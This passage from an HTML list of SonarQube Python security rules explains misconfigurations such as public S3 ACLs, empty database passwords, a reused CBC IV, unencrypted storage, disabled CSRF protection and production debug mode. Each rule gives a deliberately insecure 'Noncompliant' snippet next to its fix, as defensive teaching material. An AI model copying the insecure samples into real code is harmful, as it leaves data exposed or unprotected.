  nested quantifier situation <code>(ba&#43;)&#43;</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists
  exactly one <code>b</code> char per repetition of the group. </li><li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code> (available since Python 3.11). </li><li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li></ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial
matches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul><li> Solve the problem without regular expressions </li><li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2" rel="nofollow">RE2</a>. </li><li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>re.split(&#34;\s*,\s*&#34;, my_str)</code> with <code>re.split(&#34;,&#34;,
  my_str)</code> and then trimming the spaces from the strings as a second step. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li><li> <a href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016" rel="nofollow">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li><li> <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers" rel="nofollow">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6265">
              python:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul><li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively &#34;read&#34; and &#34;read and write&#34; privileges to everyone in the world
  (<code>AllUsers</code> group). </li><li> <code>AUTHENTICATED_READ</code> grants &#34;read&#34; privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, i.e., to grant necessary permissions only to users for their required tasks. In the
context of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access
control:</p>
<pre>
bucket &#61; s3.Bucket(self, &#34;bucket&#34;,
    access_control&#61;s3.BucketAccessControl.PUBLIC_READ_WRITE     # Sensitive
)

s3deploy.BucketDeployment(self, &#34;DeployWebsite&#34;,
    access_control&#61;s3.BucketAccessControl.PUBLIC_READ_WRITE     # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>
<pre>
bucket &#61; s3.Bucket(self, &#34;bucket&#34;,
    access_control&#61;s3.BucketAccessControl.PRIVATE       # Compliant
)

# Another example
s3deploy.BucketDeployment(self, &#34;DeployWebsite&#34;,
    access_control&#61;s3.BucketAccessControl.PRIVATE       # Compliant
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html" rel="nofollow">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html" rel="nofollow">AWS CDK version 2</a> - Class Bucket (construct) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2115">
              python:S2115
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When relying on the password authentication mode for the database connection, a secure password should be chosen.</p>
<p>This rule raises an issue when an empty password is used.</p>
<h3>Noncompliant code example</h3>
<p>Flask-SQLAlchemy</p>
<pre>
def configure_app(app):
    app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] &#61; &#34;postgresql://user:&#64;domain.com&#34; # Noncompliant
</pre>
<p>Django</p>
<pre>
# settings.py

DATABASES &#61; {
    &#39;postgresql_db&#39;: {
        &#39;ENGINE&#39;: &#39;django.db.backends.postgresql&#39;,
        &#39;NAME&#39;: &#39;quickdb&#39;,
        &#39;USER&#39;: &#39;sonarsource&#39;,
        &#39;PASSWORD&#39;: &#39;&#39;, # Noncompliant
        &#39;HOST&#39;: &#39;localhost&#39;,
        &#39;PORT&#39;: &#39;5432&#39;
    }
}
</pre>
<p>mysql/mysql-connector-python</p>
<pre>
from mysql.connector import connection

connection.MySQLConnection(host&#61;&#39;localhost&#39;, user&#61;&#39;sonarsource&#39;, password&#61;&#39;&#39;)  # Noncompliant
</pre>
<h3>Compliant solution</h3>
<p>Flask-SQLAlchemy</p>
<pre>
def configure_app(app, pwd):
    app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] &#61; f&#34;postgresql://user:{pwd}&#64;domain.com&#34; # Compliant
</pre>
<p>Django</p>
<pre>
# settings.py
import os

DATABASES &#61; {
    &#39;postgresql_db&#39;: {
        &#39;ENGINE&#39;: &#39;django.db.backends.postgresql&#39;,
        &#39;NAME&#39;: &#39;quickdb&#39;,
        &#39;USER&#39;: &#39;sonarsource&#39;,
        &#39;PASSWORD&#39;: os.getenv(&#39;DB_PASSWORD&#39;),      # Compliant
        &#39;HOST&#39;: &#39;localhost&#39;,
        &#39;PORT&#39;: &#39;5432&#39;
    }
}
</pre>
<p>mysql/mysql-connector-python</p>
<pre>
from mysql.connector import connection
import os

db_password &#61; os.getenv(&#39;DB_PASSWORD&#39;)
connection.MySQLConnection(host&#61;&#39;localhost&#39;, user&#61;&#39;sonarsource&#39;, password&#61;db_password)  # Compliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken
  Authentication </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S3329">
              python:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a &#34;starting variable&#34; (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in pyca</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.ciphers import (
    Cipher,
    algorithms,
    modes,
)

iv     &#61; &#34;doNotTryThis&#64;Home2023&#34;
cipher &#61; Cipher(algorithms.AES(key), modes.CBC(iv))

cipher.encryptor()  # Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
from os import urandom

from cryptography.hazmat.primitives.ciphers import (
    Cipher,
    algorithms,
    modes,
)

iv     &#61; urandom(16)
cipher &#61; Cipher(algorithms.AES(key), modes.CBC(iv))

cipher.encryptor()
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure strong security, the initialization vectors for each encryption operation must be unique and random but they do not have to be
secret.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br /> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/329" rel="nofollow">MITRE, CWE-329</a> - Not Using an Unpredictable IV with CBC Mode </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf" rel="nofollow">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6275">
              python:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default" rel="nofollow">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The disk contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html" rel="nofollow">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
from aws_cdk.aws_ec2 import Volume

class EBSVolumeStack(Stack):

    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        Volume(self,
            &#34;unencrypted-explicit&#34;,
            availability_zone&#61;&#34;eu-west-1a&#34;,
            size&#61;Size.gibibytes(1),
            encrypted&#61;False  # Sensitive
        )
</pre>
<pre>
from aws_cdk.aws_ec2 import Volume

class EBSVolumeStack(Stack):

    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        Volume(self,
            &#34;unencrypted-implicit&#34;,
            availability_zone&#61;&#34;eu-west-1a&#34;,
            size&#61;Size.gibibytes(1)
        ) # Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html" rel="nofollow">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
from aws_cdk.aws_ec2 import Volume

class EBSVolumeStack(Stack):

    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        Volume(self,
            &#34;encrypted-explicit&#34;,
            availability_zone&#61;&#34;eu-west-1a&#34;,
            size&#61;Size.gibibytes(1),
            encrypted&#61;True
        )
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html" rel="nofollow">Amazon EBS encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6270">
              python:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The AWS resource stores or processes sensitive data. </li><li> The AWS resource is designed to be private. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, AnyPrincipal, Effect
from aws_cdk.aws_s3 import Bucket

bucket &#61; Bucket(self, &#34;ExampleBucket&#34;)

bucket.add_to_resource_policy(PolicyStatement(
  effect&#61;Effect.ALLOW,
  actions&#61;[&#34;s3:*&#34;],
  resources&#61;[bucket.arn_for_objects(&#34;*&#34;)],
  principals&#61;[AnyPrincipal()] # Sensitive
))
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, AccountRootPrincipal, Effect
from aws_cdk.aws_s3 import Bucket

bucket &#61; Bucket(self, &#34;ExampleBucket&#34;)

bucket.add_to_resource_policy(PolicyStatement(
  effect&#61;Effect.ALLOW,
  actions&#61;[&#34;s3:*&#34;],
  resources&#61;[bucket.arn_for_objects(&#34;*&#34;)],
  principals&#61;[AccountRootPrincipal()]
))
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4502">
              python:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses cookies to authenticate users. </li><li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li><li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Protection against CSRF attacks is strongly recommended:
    <ul><li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">unsafe HTTP
      methods</a>. </li><li> implemented, for example, with an unguessable CSRF token </li></ul>  </li><li> Of course all sensitive operations should not be performed with <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li></ul>
<h2>Sensitive Code Example</h2>
<p>For a <a href="https://docs.djangoproject.com/fr/3.0/ref/csrf/" rel="nofollow">Django</a> application, the code is sensitive when,</p>
<ul><li> <code>django.middleware.csrf.CsrfViewMiddleware</code> is not used in the <a href="https://docs.djangoproject.com/en/3.0/topics/settings/" rel="nofollow">Django settings</a>: </li></ul>
<pre>
MIDDLEWARE &#61; [
    &#39;django.middleware.security.SecurityMiddleware&#39;,
    &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;,
    &#39;django.middleware.common.CommonMiddleware&#39;,
    &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;,
    &#39;django.contrib.messages.middleware.MessageMiddleware&#39;,
    &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;,
] # Sensitive: django.middleware.csrf.CsrfViewMiddleware is missing
</pre>
<ul><li> the CSRF protection is disabled on a view: </li></ul>
<pre>
&#64;csrf_exempt # Sensitive
def example(request):
    return HttpResponse(&#34;default&#34;)
</pre>
<p>For a <a href="https://flask-wtf.readthedocs.io/en/latest/csrf.html" rel="nofollow">Flask</a> application, the code is sensitive when,</p>
<ul><li> the <code>WTF_CSRF_ENABLED</code> setting is set to <code>false</code>: </li></ul>
<pre>
app &#61; Flask(__name__)
app.config[&#39;WTF_CSRF_ENABLED&#39;] &#61; False # Sensitive
</pre>
<ul><li> the application doesn’t use the <code>CSRFProtect</code> module: </li></ul>
<pre>
app &#61; Flask(__name__) # Sensitive: CSRFProtect is missing

&#64;app.route(&#39;/&#39;)
def hello_world():
    return &#39;Hello, World!&#39;
</pre>
<ul><li> the CSRF protection is disabled on a view: </li></ul>
<pre>
app &#61; Flask(__name__)
csrf &#61; CSRFProtect()
csrf.init_app(app)

&#64;app.route(&#39;/example/&#39;, methods&#61;[&#39;POST&#39;])
&#64;csrf.exempt # Sensitive
def example():
    return &#39;example &#39;
</pre>
<ul><li> the CSRF protection is disabled on a form: </li></ul>
<pre>
class unprotectedForm(FlaskForm):
    class Meta:
        csrf &#61; False # Sensitive

    name &#61; TextField(&#39;name&#39;)
    submit &#61; SubmitField(&#39;submit&#39;)
</pre>
<h2>Compliant Solution</h2>
<p>For a <a href="https://docs.djangoproject.com/fr/3.0/ref/csrf/" rel="nofollow">Django</a> application,</p>
<ul><li> it is recommended to protect all the views with <code>django.middleware.csrf.CsrfViewMiddleware</code>: </li></ul>
<pre>
MIDDLEWARE &#61; [
    &#39;django.middleware.security.SecurityMiddleware&#39;,
    &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;,
    &#39;django.middleware.common.CommonMiddleware&#39;,
    &#39;django.middleware.csrf.CsrfViewMiddleware&#39;, # Compliant
    &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;,
    &#39;django.contrib.messages.middleware.MessageMiddleware&#39;,
    &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;,
]
</pre>
<ul><li> and to not disable the CSRF protection on specific views: </li></ul>
<pre>
def example(request): # Compliant
    return HttpResponse(&#34;default&#34;)
</pre>
<p>For a <a href="https://flask-wtf.readthedocs.io/en/latest/csrf.html" rel="nofollow">Flask</a> application,</p>
<ul><li> the <code>CSRFProtect</code> module should be used (and not disabled further with <code>WTF_CSRF_ENABLED</code> set to <code>false</code>):
  </li></ul>
<pre>
app &#61; Flask(__name__)
csrf &#61; CSRFProtect()
csrf.init_app(app) # Compliant
</pre>
<ul><li> and it is recommended to not disable the CSRF protection on specific views or forms: </li></ul>
<pre>
&#64;app.route(&#39;/example/&#39;, methods&#61;[&#39;POST&#39;]) # Compliant
def example():
    return &#39;example &#39;

class unprotectedForm(FlaskForm):
    class Meta:
        csrf &#61; True # Compliant

    name &#61; TextField(&#39;name&#39;)
    submit &#61; SubmitField(&#39;submit&#39;)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6245">
              python:S6245
            </a>
          </td>
          <td>
            <details>
              <p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul><li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul><li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li></ul>  </li><li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul><li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li></ul>  </li><li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul><li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li></ul>  </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
bucket &#61; s3.Bucket(self,&#34;bucket&#34;,
    encryption&#61;s3.BucketEncryption.UNENCRYPTED       # Sensitive
)
</pre>
<p>The default value of <code>encryption</code> is <code>KMS</code> if <code>encryptionKey</code> is set. Otherwise, if both parameters are absent the
bucket is unencrypted.</p>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
<pre>
bucket &#61; s3.Bucket(self,&#34;bucket&#34;,
    encryption&#61;s3.BucketEncryption.S3_MANAGED
)

# Alternatively with a KMS key managed by the user.

bucket &#61; s3.Bucket(self,&#34;bucket&#34;,
    encryptionKey&#61;access_key
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html" rel="nofollow">AWS documentation</a> - Protecting data using
  server-side encryption </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html" rel="nofollow">AWS CDK version 2</a> - BucketEncryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4507">
              python:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<pre>
from django.conf import settings

settings.configure(DEBUG&#61;True)  # Sensitive when set to True
settings.configure(DEBUG_PROPAGATE_EXCEPTIONS&#61;True)  # Sensitive when set to True

def custom_config(config):
    settings.configure(default_settings&#61;config, DEBUG&#61;True)  # Sensitive
</pre>
<p>Django’s &#34;settings.py&#34; or &#34;global_settings.py&#34; configuration file:</p>
<pre>
# NOTE: The following code raises issues only if the file is named &#34;settings.py&#34; or &#34;global_settings.py&#34;. This is the default
# name of Django configuration file

DEBUG &#61; True  # Sensitive
DEBUG_PROPAGATE_EXCEPTIONS &#61; True  # Sensitive
</pre>
<h2>See</h2>
